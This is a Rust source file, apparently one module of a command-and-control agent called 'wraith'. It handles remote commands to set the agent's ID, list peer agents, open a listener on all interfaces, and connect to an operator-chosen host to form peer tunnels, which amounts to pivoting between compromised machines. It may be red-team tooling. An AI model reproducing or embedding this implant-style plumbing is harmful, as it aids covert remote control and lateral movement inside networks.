use crate::message::codec::MessageCodec;
use crate::proto::wraith::{Command as ProtoCommand, CommandResult};
use crate::wraith::state::WraithState;
use crate::wraith::session::TunnelManager;
use log::{debug, error, info};
use std::sync::Arc;

#[derive(Clone)]
pub struct AgentCommands {
    tunnel_manager: Option<Arc<TunnelManager>>,
}

impl AgentCommands {
    pub fn new(tunnel_manager: Arc<TunnelManager>) -> Self {
        Self { tunnel_manager: Some(tunnel_manager) }
    }

    pub fn new_without_tunnel() -> Self {
        Self { tunnel_manager: None }
    }

    pub fn handle_set_id(&self, cmd: &ProtoCommand, state: &mut WraithState) -> CommandResult {
        let new_id = cmd.params.get("wraith_id").cloned().unwrap_or_default();
        if new_id.is_empty() {
            return MessageCodec::command_result_error(
                cmd.command_id.clone(),
                "wraith_id parameter required".to_string(),
            );
        }

        state.set_wraith_id(new_id.clone());
        info!("Wraith ID set to: {}", new_id);

        MessageCodec::command_result_success(cmd.command_id.clone(), new_id)
    }

    pub fn handle_list_peers(&self, cmd: &ProtoCommand, state: &WraithState) -> CommandResult {
        let local_id = state.wraith_id.clone();
        let peers: Vec<_> = state.peer_table.iter().map(|(id, pc)| {
            serde_json::json!({
                "wraith_id": pc.wraith_id,
                "hostname": pc.hostname,
                "connected": true
            })
        }).collect();

        let output = serde_json::json!({
            "wraith_id": local_id,
            "peers": peers
        }).to_string();

        debug!("list_peers: {}", output);

        MessageCodec::command_result_success(cmd.command_id.clone(), output)
    }

    pub fn handle_wraith_listen(&self, cmd: &ProtoCommand) -> CommandResult {
        let port: u16 = cmd.params.get("port").and_then(|s| s.parse().ok()).unwrap_or(4445);
        debug!("wraith_listen: starting peer listener on port {}", port);

        let tunnel_manager = self.tunnel_manager.clone().unwrap();
        tokio::spawn(async move {
            if let Err(e) = tunnel_manager.start_peer_listener(&format!("0.0.0.0:{}", port)).await {
                error!("Peer listener error: {}", e);
            }
        });

        MessageCodec::command_result_success(
            cmd.command_id.clone(),
            format!("Listening for peer connections on port {}", port),
        )
    }

    pub fn handle_wraith_connect(&self, cmd: &ProtoCommand, state: &WraithState) -> CommandResult {
        let host = cmd.params.get("host").cloned().unwrap_or_default();
        let port: u16 = cmd.params.get("port").and_then(|s| s.parse().ok()).unwrap_or(4445);

        if host.is_empty() {
            return MessageCodec::command_result_error(
                cmd.command_id.clone(),
                "host parameter required for wraith_connect".to_string(),
            );
        }

        let addr = format!("{}:{}", host, port);
        debug!("wraith_connect: connecting to peer at {}", addr);

        let tunnel_manager = self.tunnel_manager.clone().unwrap();
        let wraith_id = state.wraith_id.clone();
        let hostname = state.hostname.clone();
        let os = state.os.clone();

        tokio::spawn(async move {
            if let Err(e) = Arc::clone(&tunnel_manager).connect_to_peer(addr, wraith_id, hostname, os).await {
                log::error!("Failed to connect to peer: {}", e);
            }
        });

        CommandResult {
            command_id: cmd.command_id.clone(),
            status: "connecting".to_string(),
            output: format!("Initiating connection to peer at {}:{}", host, port),
            exit_code: 0,
            duration_ms: 0,
            error: String::new(),
        }
    }
}
